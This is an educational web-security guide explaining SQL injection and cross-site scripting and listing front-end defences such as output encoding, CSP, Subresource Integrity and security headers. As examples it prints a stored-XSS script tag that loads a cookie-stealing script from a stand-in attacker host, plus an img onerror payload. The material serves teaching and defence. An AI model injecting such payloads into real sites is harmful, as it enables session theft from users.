# Web Security

## Web Applications Defined
From a technical viewpoint, the web is a highly programmable environment that allows mass customization through the immediate deployment of a large and diverse range of applications to millions of global users. Web applications are, therefore, computer programs allowing website visitors to submit and retrieve data to/from a database over the Internet using their preferred web browser.   
<br />
<br />
## Web Application Attack
Despite their advantages, web applications do raise a number of security concerns stemming from improper coding. Serious weaknesses or vulnerabilities allow criminals to gain direct and public access to databases in order to churn sensitive data – this is known as a web application attack.

If web applications are not secure, i.e. vulnerable to at least one of the various forms of hacking techniques, then your entire database of sensitive information is at serious risk of a web application attack. [SQL Injection](https://www.acunetix.com/websitesecurity/sql-injection/) attack types, which target the databases directly, are still the most common and the most dangerous type of vulnerability. Other attackers may inject malicious code using the user input of vulnerable web applications to trick users and redirect them towards phishing sites. This type of attack is called [Cross-Site Scripting](https://www.acunetix.com/websitesecurity/cross-site-scripting/) (XSS attacks) and may be used even though the web servers and database engine contain no vulnerability themselves.   
<br />
<br />
## What is SQL injection (SQLi)?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.   
<br />
<br />
### SQL injection examples
Most common SQL injection example is hacking the application database via login form. You can inject a SQL query to the name or password input and submit to check if there is any vulnarability. Check the [cheat sheet](https://sechow.com/bricks/docs/login-1.html) for sql string alternatives.  

There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:
-   [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data), where you can modify an SQL query to return additional results.
-   [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic), where you can change a query to interfere with the application's logic.
-   [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), where you can retrieve data from different database tables.
-   [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database), where you can extract information about the version and structure of the database.
-   [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), where the results of a query you control are not returned in the application's responses.
<br />
<br />
## What is cross-site scripting (XSS)?
Cross-site scripting (XSS) is a type of injection attack in which a threat actor inserts data, such as a malicious [script](https://www.techtarget.com/whatis/definition/script), into content from trusted websites. The malicious code is then included with dynamic content delivered to a victim's browser. XSS enables an attacker to execute malicious scripts in another user's browser. However, instead of attacking the victim directly, the attacker exploits a vulnerability in a website the victim visits and gets the website to deliver the malicious script.
<br />
<br />
### What are examples of cross-site scripting?
One example of a stored XSS attack is to [inject malicious code into the comment field](https://www.techtarget.com/whatis/definition/input-validation-attack) of an e-commerce site. An attacker embeds code within a comment, writing "Read my review of this item!" alongside code with a malicious URL embedded. The code might say something like:
```html
<script src=http://evilhack.com/authstealer.js></script>
```
This will cause the website's server to store the malicious script as a comment. When the user visits the page with comments on it, the browser will interpret the code as JavaScript instead of HTML and execute the code.

The comment containing the malicious content between the script tags will load every time the page is loaded. Loading the page will activate a malicious JavaScript file hosted on another website, which can steal a user's session cookies. The cookies likely store important information about the user's behavior on the e-commerce site, such as login information. With that information, the hacker may be able to access more sensitive data on the account, such as payment or contact information.

The user does not need to click any link on the page -- or even see the malicious comment -- for it to steal data; the user simply needs to visit the page. This is different from a reflected XSS attack, which would require the user to click on the link.

There are many html attribute that can be used for exploitation. Check the [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) to explore alternatives.
<br />
<br />
## How to prevent XSS attacks

### Beware of Incoming Data
- **Filter input on arrival-** When the input is received, filter data based on what is expected or valid input.
- **Encode data on output-** When user-controllable data is provided in HTTP responses, encode the output to prevent it from being executed by HTML parser. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
- **Use appropriate response headers-** To prevent XSS in HTTP responses that aren’t intended to contain any HTML or JavaScript, we can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend. Eg. A JSON data should never be encoded as text/html, to prevent it from accidental execution.
<br \>
<br \>
### Strict User Input (the First Point of Attack)
User input should always be strict in nature, to avoid vulnerabilities like SQL injection, clickjacking, etc. So it’s important to validate or sanitize user input before sending it to the back end. Sanitizing data can be done by removing or replacing contextually-dangerous characters, such as by using a whitelist and escaping the input data. However, sanitizing and encoding is not an easy task for all existing possibilities, there are some open-source libraries comes to the rescue:

-   [DOMPurify](https://www.npmjs.com/package/dompurify). This is the most simple to use and has one method to sanitize the user’s input. It has an option to customize the rules and it supports HTML5, SVG, and MathML.
-   [secure-filters](https://www.npmjs.com/package/secure-filters). A Salesforce library that provides methods to sanitize HTML, JavaScript, inline CSS styles, and other contexts. It’s especially useful if you want to make use of user input in other places, for example generating CSS or JavaScript.

In the case of file upload always check the file type and use a file filter function and allow only certain file types to get upload. Refer to [this](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) for more.
<br />
<br />
### Consider using `textContent` instead of `innerHTML`
If you’re changing text only, you can use `textContent` instead of `innerHTML`. Let’s say you want to get a text value from an input field, and you want to output that text value into the DOM. Here’s the code to get the text value:
```javascript
const value = input.value
```
But the user can try to enter something malicious, like this snippet:
```html
<img src="x" onerror=alert("HACKED!")>
```
If you use `innerHTML`, you’ll create the `<img>` element and run the `onerror` handler. This is where XSS begins. Using `textContent` instead, as it can only output text and doesn’t generate any HTML. If you don’t generate HTML, there’s no way to insert JavaScript. You’ll see `<img src="x" onerror=alert("HACKED!")>` in the DOM, but the JavaScript won’t run.
<br />
<br />
## Other Security Measures on Frontend

### Use a Strong Content Security Policy (CSP)
Never trust _everything_ that the server sends, always define a strong Content-Security-Policy HTTP header which only allows certain trusted content to be executed on the browser or render more resources.

It’s good practice to have a whitelist, a list of allowed sources. Now, even if an attacker injects script, the script won’t match the whitelist and won’t be executed.

For example:
```
content-security-policy: script-src ‘self’ https://apis.xyz.com
```
Here the application trusts only the scripts coming from `apis.xyz.com` and ourselves (`self`). For the rest of the sources, an error in the console is thrown.

Note: A strong content security policy does not solve the problem of inline scripts execution, hence XSS attack is still valid. You can read a full list of CSP directives on the [MDN website](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy).
<br />
<br />
### Avoid Third-Party Services
One line of code third-party services like Google Analytics, Google Tag Manager, Intercom, Mixpanel, can make your web app vulnerable. Think of a situation when these third party services are compromised.

It’s important to have a strong CSP policy. Most third-party services have a defined CSP directive, so always add them.

Also, be sure to include `integrity` attribute when possible when adding a script tag. [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) feature can validate the cryptographic hash of the script and make sure it hasn’t been tampered with.
```html
<script src= "https://example.com/example-framework.js" integrity= "sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..." crossorigin= "anonymous" ></script>
```

### Enable XSS Protection Mode
If somehow an attacker injects malicious code from the user input, we can instruct the browser to block the response by supplying the `"X-XSS-Protection": "1; mode=block"` header.

Most modern browsers have XSS protection mode enabled by default but it’s still recommended to include the `X-XSS-Protection` header. This helps to ensure better security for older browsers that don't support CSP headers.
<br />
<br />
### Disable iframe Embedding
The disabling iframe can project us from a **clickjacking attack.** We should always use the `"X-Frame-Options": "DENY"` header in the request that prohibits the rendering of the website in a frame.Also, we can use `frame-ancestors` CSP directive, which provides more control over which parents can embed the page in an iframe.
<br />
<br />
### Beware Of Hidden Fields or Data Stored in Browser Memory
If we add input `type="hidden"` to hide sensitive data in pages or add them in the browser `localStorage`, `sessionStorage`, `cookies` and think that’s safe, we need to think again. Everything added to the browser can be accessed by the attacker easily. An attacker can open the dev tools and change all the in-memory variables. And what if you had hidden the auth page depending upon the `localStorage`, `sessionStorage`, and `cookies` values?

There are tools like [ZapProxy](https://www.zaproxy.org/) and even inspection tools in the browser that can expose those values to attackers if they find a way to inject a script, and they can then can use them to attack further. Hence avoid using `type="hidden"` and avoid storing keys, auth tokens, etc, in the browser in-memory storage as much as possible.
<br />
<br />
### Use Captcha
Using Captcha at public-facing endpoints (login, registration, contact). A Captcha is a computer program or system intended to distinguish humans from bots and can help stop DoS ([Denial Of Service](https://www.cloudflare.com/learning/ddos/glossary/denial-of-service/)) attacks.
<br />
<br />
### Always Set `Referrer-Policy`
Whenever we use anchor tag or a link that navigates away from the website, make sure you use a header policy `"Referrer-Policy": "no-referrer"` or, in case of the anchor tag, set `rel = noopener or noreferrer`. When we don’t set these headers and rel, the destination website can obtain data like session tokens and database IDs.
<br />
<br />
### Use Limited Browser Features & APIs
As in CSP, the limited domain can connect to the website, the same principle can also be applied to browser features & APIs. We can add a `Feature-Policy` header to deny access to certain features and APIs. [Read more](https://www.smashingmagazine.com/2018/12/feature-policy/).

_Tip: Set_ `_none_` _for all features that you don't use._
<br />
<br />
### Audit Dependencies Regularly
Run `npm audit` regularly to get a list of vulnerable packages and upgrade them to avoid security issues. GitHub now flags vulnerable dependencies. We can also use [Snyk](https://snyk.io/) that checks your source code automatically and opens pull requests to bump versions.
<br />
<br />
### Keep Errors Generic
An error like “Your password is incorrect,” may be helpful to the user but also to the attackers. They may figure out information from these errors that helps them to plan their next action. When dealing with accounts, emails, and PII, we should try to use ambiguous errors like “Incorrect login information.”
<br \>
<br \>
### Compartmentalize your application 
Web applications are often built as single applications, deployed in a single origin within the browser. For example, an app running in [https://app.example.com](https://app.example.com/) offers public parts, authenticated parts, and even administrator features. However a successful attack against the public part of the application automatically affects the other parts as well, potentially causing significant damage.

In the backend, monolithic applications are often split up into smaller components, each running individually, we can apply a similar pattern to front end applications. For example, we could separate the front end application into a public part, an authenticated part, and an admin part. By deploying each part in a separate origin. For example, [https://public.example.com](https://public.example.com/), [https://users.example.com](https://users.example.com/), and [https://admin.example.com](https://admin.example.com/). We can ensure that the browser isolates these applications from each other.
<br />
<br />
### For Further Reading:
https://medium.com/@tattwei46/what-is-sql-injection-and-xss-2a3f2e7ea0d
https://owasp.org/www-community/attacks/xss/

### Video lesson all covered:
https://frontendmasters.com/courses/web-security/?utm_source=css-tricks&utm_medium=website&utm_campaign=css-tricks-tags-sidebar
